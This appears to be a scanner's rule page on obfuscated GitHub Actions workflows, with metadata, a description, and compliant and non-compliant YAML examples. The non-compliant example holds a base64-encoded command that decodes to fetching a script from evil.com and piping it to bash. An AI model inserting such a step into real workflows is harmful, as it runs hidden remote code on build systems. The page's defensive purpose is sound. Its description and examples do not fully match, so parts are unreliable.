---
title: "Obfuscation"
group_id: "CICD / GitHub"
meta:
  name: "github/obfuscation"
  id: "39619709-d7d4-4e8a-ba5b-517e1c4f2a8b"
  display_name: "Obfuscation"
  cloud_provider: "GitHub"
  platform: "CICD"
  severity: "MEDIUM"
  category: "Insecure Configurations"
---
## Metadata

**Id:** `39619709-d7d4-4e8a-ba5b-517e1c4f2a8b`

**Cloud Provider:** GitHub

**Platform:** CICD

**Severity:** Medium

**Category:** Insecure Configurations

#### Learn More

 - [Provider Reference](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)

### Description

Obfuscated GitHub Actions usage (for example, weird `uses:` paths or needlessly complex/fenced expressions) makes workflows harder to audit and can hide malicious or unintended behavior.

For repository action references, the step `uses` property must not contain empty path components, `.` or `..`. It should be normalized to the concrete form `owner/repo[/path]@ref` so pattern-matching and provenance analysis work reliably.

For expressions anywhere routable text is allowed (such as step inputs/outputs and workflow fields), constant-reducible expressions should be replaced by their evaluated constant, and computed index expressions should be avoided. When replacing an entire fenced expression written `${{ ... }}`, the fix must remove the fencing to preserve semantics. Fixes for reducible sub-expressions should target only the subfragment.

This rule flags step `uses` values with empty components or `.`/`..`, fenced expressions that can be constant-reduced, and computed index expressions. Automated fixes normalize `uses` paths and either replace full expressions with their evaluated value or rewrite only the reducible subexpression when possible.

Secure examples:

```yaml
# normalized repository action reference
- uses: actions/checkout@v4
```

```yaml
# replace constant-fenced expression with its evaluated value
outputs:
  iac/terraform/attribution.tfm--release_created: steps.release.outputs.iac/terraform/attribution.tfm--release_created
```

## Compliant Code Examples
```yaml
name: compliant-workflow

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run tests
        run: npm test

      - name: Build application
        run: npm run build

```
## Non-Compliant Code Examples
```yaml
name: insecure-workflow

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run obfuscated command
        run: echo 'Y3VybCBodHRwOi8vZXZpbC5jb20vc2NyaXB0LnNoIHwgYmFzaA==' | base64 -d | bash

      - name: Build application
        run: npm run build

```